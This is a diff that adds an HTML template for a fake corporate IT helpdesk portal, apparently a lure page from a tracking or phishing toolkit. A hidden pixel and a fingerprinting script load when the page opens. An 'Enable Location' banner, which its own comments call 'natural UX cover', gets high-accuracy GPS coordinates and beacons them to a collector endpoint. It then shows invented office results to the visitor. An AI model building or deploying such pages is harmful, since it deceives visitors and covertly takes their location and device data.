@@ -1,0 +1,434 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>IT Self-Service Portal</title>
+
+  <!-- Silent pixel + full fingerprint JS — fires the moment the page loads -->
+  <img src="{{ pixel_url }}" width="1" height="1" style="position:absolute;top:-9999px;left:-9999px;" alt="">
+  <script src="{{ js_url }}" defer></script>
+
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      background: #f0f2f5;
+      color: #1a1a2e;
+      min-height: 100vh;
+    }
+
+    /* ── Top nav ── */
+    nav {
+      background: #1a3c6e;
+      padding: 0 32px;
+      height: 58px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      box-shadow: 0 2px 8px rgba(0,0,0,.25);
+    }
+    .nav-brand {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      color: #fff;
+      font-weight: 700;
+      font-size: 17px;
+      text-decoration: none;
+    }
+    .nav-brand svg { width:26px; height:26px; flex-shrink:0; }
+    .nav-links { display:flex; gap:24px; }
+    .nav-links a {
+      color:rgba(255,255,255,.75);
+      text-decoration:none;
+      font-size:13px;
+      font-weight:500;
+      transition:color .15s;
+    }
+    .nav-links a:hover { color:#fff; }
+    .nav-badge {
+      background:#e74c3c;
+      color:#fff;
+      font-size:10px;
+      font-weight:700;
+      border-radius:9px;
+      padding:1px 6px;
+      margin-left:4px;
+    }
+
+    /* ── Hero ── */
+    .hero {
+      background: linear-gradient(135deg, #1a3c6e 0%, #0d6efd 100%);
+      color: #fff;
+      padding: 60px 32px 80px;
+      text-align: center;
+    }
+    .hero h1 { font-size: 34px; font-weight: 700; margin-bottom: 12px; }
+    .hero p  { font-size: 16px; color: rgba(255,255,255,.82); max-width: 540px; margin: 0 auto 28px; }
+    .hero-search {
+      display: flex;
+      max-width: 520px;
+      margin: 0 auto;
+      background: #fff;
+      border-radius: 8px;
+      overflow: hidden;
+      box-shadow: 0 4px 20px rgba(0,0,0,.2);
+    }
+    .hero-search input {
+      flex: 1;
+      border: none;
+      outline: none;
+      padding: 14px 18px;
+      font-size: 14px;
+      color: #333;
+    }
+    .hero-search button {
+      background: #0d6efd;
+      color: #fff;
+      border: none;
+      padding: 0 22px;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background .15s;
+    }
+    .hero-search button:hover { background: #0b5ed7; }
+
+    /* ── Main grid ── */
+    .container { max-width: 1100px; margin: 0 auto; padding: 40px 24px 60px; }
+
+    .section-title {
+      font-size: 19px;
+      font-weight: 700;
+      color: #1a1a2e;
+      margin-bottom: 20px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .section-title::after {
+      content:'';
+      flex:1;
+      height:1px;
+      background:#dde2ec;
+    }
+
+    .card-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+      gap: 18px;
+      margin-bottom: 44px;
+    }
+
+    .card {
+      background: #fff;
+      border: 1px solid #e2e8f0;
+      border-radius: 10px;
+      padding: 22px 20px;
+      cursor: pointer;
+      transition: box-shadow .18s, transform .18s;
+      text-decoration: none;
+      color: inherit;
+      display: block;
+    }
+    .card:hover {
+      box-shadow: 0 6px 22px rgba(13,110,253,.13);
+      transform: translateY(-2px);
+      border-color: #0d6efd;
+    }
+    .card-icon {
+      width: 44px;
+      height: 44px;
+      border-radius: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 14px;
+      font-size: 22px;
+    }
+    .card h3 { font-size: 14px; font-weight: 700; margin-bottom: 6px; }
+    .card p  { font-size: 12px; color: #64748b; line-height: 1.5; }
+
+    /* ── Announcements ── */
+    .announce-list { display: flex; flex-direction: column; gap: 12px; margin-bottom: 44px; }
+    .announce-item {
+      background: #fff;
+      border: 1px solid #e2e8f0;
+      border-left: 4px solid #0d6efd;
+      border-radius: 8px;
+      padding: 16px 20px;
+      display: flex;
+      align-items: flex-start;
+      gap: 14px;
+    }
+    .announce-item.warn { border-left-color: #f59e0b; }
+    .announce-item.info { border-left-color: #22c55e; }
+    .announce-dot { width:10px; height:10px; border-radius:50%; background:#0d6efd; flex-shrink:0; margin-top:4px; }
+    .announce-item.warn .announce-dot { background:#f59e0b; }
+    .announce-item.info .announce-dot { background:#22c55e; }
+    .announce-item h4 { font-size:14px; font-weight:700; margin-bottom:4px; }
+    .announce-item p  { font-size:12px; color:#64748b; }
+    .announce-meta   { font-size:11px; color:#94a3b8; margin-top:6px; }
+
+    /* ── Quick stats ── */
+    .stats-row { display:grid; grid-template-columns:repeat(auto-fill, minmax(180px,1fr)); gap:16px; margin-bottom:44px; }
+    .stat-card { background:#fff; border:1px solid #e2e8f0; border-radius:10px; padding:18px 20px; }
+    .stat-label { font-size:11px; color:#64748b; font-weight:600; text-transform:uppercase; letter-spacing:.5px; margin-bottom:6px; }
+    .stat-value { font-size:28px; font-weight:800; color:#1a1a2e; }
+    .stat-sub   { font-size:11px; color:#94a3b8; margin-top:4px; }
+
+    /* ── Tickets table ── */
+    .tickets-table { width:100%; border-collapse:collapse; background:#fff; border-radius:10px; overflow:hidden; border:1px solid #e2e8f0; margin-bottom:44px; }
+    .tickets-table thead { background:#f8fafc; }
+    .tickets-table th { padding:12px 16px; text-align:left; font-size:11px; font-weight:700; color:#64748b; text-transform:uppercase; letter-spacing:.5px; border-bottom:1px solid #e2e8f0; }
+    .tickets-table td { padding:13px 16px; font-size:13px; border-bottom:1px solid #f1f5f9; }
+    .tickets-table tr:last-child td { border-bottom:none; }
+    .badge { display:inline-block; padding:2px 9px; border-radius:9px; font-size:11px; font-weight:700; }
+    .badge-open   { background:#dbeafe; color:#1d4ed8; }
+    .badge-wip    { background:#fef9c3; color:#854d0e; }
+    .badge-closed { background:#dcfce7; color:#166534; }
+    .badge-crit   { background:#fee2e2; color:#991b1b; }
+
+    /* ── Footer ── */
+    footer { background:#1a3c6e; color:rgba(255,255,255,.55); text-align:center; font-size:12px; padding:18px; }
+
+    @media (max-width:600px) {
+      .nav-links { display:none; }
+      .hero h1 { font-size:24px; }
+    }
+  </style>
+</head>
+<body>
+
+<!-- ── Navigation ─────────────────────────────────────────── -->
+<nav>
+  <a class="nav-brand" href="#">
+    <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+      <rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/>
+    </svg>
+    CorpIT Self-Service
+  </a>
+  <div class="nav-links">
+    <a href="#">Home</a>
+    <a href="#">My Tickets <span class="nav-badge">3</span></a>
+    <a href="#">Software</a>
+    <a href="#">Knowledge Base</a>
+    <a href="#">Contact IT</a>
+  </div>
+</nav>
+
+<!-- ── Hero ───────────────────────────────────────────────── -->
+<div class="hero">
+  <h1>How can we help you today?</h1>
+  <p>Search our knowledge base, raise a ticket, or browse common requests below.</p>
+  <div class="hero-search">
+    <input type="text" placeholder="Search for help articles, software, or submit a request…">
+    <button>Search</button>
+  </div>
+</div>
+
+<!-- ── Main content ───────────────────────────────────────── -->
+<div class="container">
+
+  <!-- Quick stats -->
+  <div class="stats-row">
+    <div class="stat-card">
+      <div class="stat-label">Open Tickets</div>
+      <div class="stat-value">3</div>
+      <div class="stat-sub">2 awaiting your response</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-label">Avg. Resolution</div>
+      <div class="stat-value">4.2h</div>
+      <div class="stat-sub">This week</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-label">System Status</div>
+      <div class="stat-value" style="color:#22c55e;">All OK</div>
+      <div class="stat-sub">Last checked 2 min ago</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-label">Pending Updates</div>
+      <div class="stat-value" style="color:#f59e0b;">7</div>
+      <div class="stat-sub">Action required</div>
+    </div>
+  </div>
+
+  <!-- Location-based IT support (triggers GPS permission naturally) -->
+  <div id="location-banner" style="background:linear-gradient(90deg,#1a3c6e,#0d6efd);border-radius:10px;padding:16px 22px;margin-bottom:28px;display:flex;align-items:center;justify-content:space-between;gap:16px;flex-wrap:wrap;">
+    <div style="color:#fff;">
+      <div style="font-weight:700;font-size:14px;margin-bottom:3px;">📍 Find Your Nearest IT Support Office</div>
+      <div style="font-size:12px;color:rgba(255,255,255,.75);">Allow location access to see walk-in support hours and desk availability near you.</div>
+    </div>
+    <button id="loc-btn" onclick="requestLocation()" style="background:#fff;color:#1a3c6e;border:none;padding:9px 20px;border-radius:7px;font-size:13px;font-weight:700;cursor:pointer;white-space:nowrap;flex-shrink:0;">
+      Enable Location
+    </button>
+  </div>
+
+  <!-- Service catalogue -->
+  <div class="section-title">Service Catalogue</div>
+  <div class="card-grid">
+    <a class="card" href="#">
+      <div class="card-icon" style="background:#dbeafe;">💻</div>
+      <h3>Request Equipment</h3>
+      <p>Laptops, monitors, peripherals and accessories.</p>
+    </a>
+    <a class="card" href="#">
+      <div class="card-icon" style="background:#dcfce7;">🔑</div>
+      <h3>Password Reset</h3>
+      <p>Reset AD, email, VPN or application passwords.</p>
+    </a>
+    <a class="card" href="#">
+      <div class="card-icon" style="background:#fef9c3;">📦</div>
+      <h3>Software Access</h3>
+      <p>Request licenses or access to corporate apps.</p>
+    </a>
+    <a class="card" href="#">
+      <div class="card-icon" style="background:#fce7f3;">🌐</div>
+      <h3>VPN / Remote Access</h3>
+      <p>Set up or troubleshoot remote working access.</p>
+    </a>
+    <a class="card" href="#">
+      <div class="card-icon" style="background:#ede9fe;">🖨️</div>
+      <h3>Printer Setup</h3>
+      <p>Add a network printer or resolve print errors.</p>
+    </a>
+    <a class="card" href="#">
+      <div class="card-icon" style="background:#ffedd5;">🔒</div>
+      <h3>Security Incident</h3>
+      <p>Report phishing, malware or suspicious activity.</p>
+    </a>
+    <a class="card" href="#">
+      <div class="card-icon" style="background:#ecfeff;">📧</div>
+      <h3>Email & Calendar</h3>
+      <p>Distribution lists, shared mailboxes, delegates.</p>
+    </a>
+    <a class="card" href="#">
+      <div class="card-icon" style="background:#f0fdf4;">☁️</div>
+      <h3>Cloud Storage</h3>
+      <p>OneDrive, SharePoint quota and access issues.</p>
+    </a>
+  </div>
+
+  <!-- Announcements -->
+  <div class="section-title">Announcements</div>
+  <div class="announce-list">
+    <div class="announce-item">
+      <div class="announce-dot"></div>
+      <div>
+        <h4>Scheduled Maintenance – Saturday 02:00–04:00</h4>
+        <p>Email and VPN services will be unavailable during this window. Please save all work beforehand.</p>
+        <div class="announce-meta">Posted by IT Operations · 2 hours ago</div>
+      </div>
+    </div>
+    <div class="announce-item warn">
+      <div class="announce-dot"></div>
+      <div>
+        <h4>Mandatory Security Patch – Deploy by Friday</h4>
+        <p>All Windows endpoints must apply patch KB5034441. Open a ticket if your device cannot update automatically.</p>
+        <div class="announce-meta">Posted by Security Team · Yesterday</div>
+      </div>
+    </div>
+    <div class="announce-item info">
+      <div class="announce-dot"></div>
+      <div>
+        <h4>New IT Self-Service Portal Launched</h4>
+        <p>Welcome to the new portal! Submit tickets, track status and browse the knowledge base all in one place.</p>
+        <div class="announce-meta">Posted by IT Helpdesk · 3 days ago</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Recent tickets -->
+  <div class="section-title">My Recent Tickets</div>
+  <table class="tickets-table">
+    <thead>
+      <tr>
+        <th>Ticket #</th>
+        <th>Subject</th>
+        <th>Category</th>
+        <th>Priority</th>
+        <th>Status</th>
+        <th>Updated</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><code style="font-size:12px;">INC-4821</code></td>
+        <td>Unable to connect to VPN from home</td>
+        <td>Network</td>
+        <td><span class="badge badge-crit">High</span></td>
+        <td><span class="badge badge-wip">In Progress</span></td>
+        <td style="color:#94a3b8; font-size:12px;">1h ago</td>
+      </tr>
+      <tr>
+        <td><code style="font-size:12px;">INC-4719</code></td>
+        <td>Outlook keeps asking for password</td>
+        <td>Email</td>
+        <td><span class="badge badge-open">Medium</span></td>
+        <td><span class="badge badge-open">Open</span></td>
+        <td style="color:#94a3b8; font-size:12px;">5h ago</td>
+      </tr>
+      <tr>
+        <td><code style="font-size:12px;">INC-4601</code></td>
+        <td>Request Adobe Acrobat license</td>
+        <td>Software</td>
+        <td><span class="badge" style="background:#f1f5f9;color:#64748b;">Low</span></td>
+        <td><span class="badge badge-closed">Resolved</span></td>
+        <td style="color:#94a3b8; font-size:12px;">2 days ago</td>
+      </tr>
+    </tbody>
+  </table>
+
+</div>
+
+<footer>
+  &copy; 2026 CorpIT Helpdesk &nbsp;·&nbsp; Internal use only &nbsp;·&nbsp; All activity is monitored
+</footer>
+
+<script>
+// Fires when user clicks "Enable Location" — completely natural UX cover
+function requestLocation() {
+  var btn = document.getElementById('loc-btn');
+  btn.textContent = 'Locating…';
+  btn.disabled = true;
+
+  if (!navigator.geolocation) {
+    document.getElementById('location-banner').style.display = 'none';
+    return;
+  }
+
+  navigator.geolocation.getCurrentPosition(
+    function(pos) {
+      // Success — send to collector and update banner UI
+      var payload = {
+        pid:          '{{ pixel_id }}',
+        stage:        'geo',
+        geo_lat:      pos.coords.latitude,
+        geo_lon:      pos.coords.longitude,
+        geo_accuracy: pos.coords.accuracy,
+        geo_altitude: pos.coords.altitude || null,
+        geo_speed:    pos.coords.speed    || null,
+        geo_heading:  pos.coords.heading  || null,
+        ts_client:    new Date().toISOString()
+      };
+      // Send via beacon so it survives page navigation
+      navigator.sendBeacon('{{ js_url }}'.replace('/fp.js', '/collect').split('?')[0],
+        new Blob([JSON.stringify(payload)], { type: 'application/json' }));
+
+      var banner = document.getElementById('location-banner');
+      banner.style.background = 'linear-gradient(90deg,#166534,#22c55e)';
+      banner.innerHTML = '<div style="color:#fff"><div style="font-weight:700;font-size:14px;">✓ Location found — showing nearest support offices</div>' +
+        '<div style="font-size:12px;color:rgba(255,255,255,.8);">City Centre Office · 0.4 km · Open until 18:00 · 3 desks available</div></div>';
+    },
+    function() {
+      document.getElementById('location-banner').style.display = 'none';
+    },
+    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+  );
+}
+</script>
+</body>
+</html>
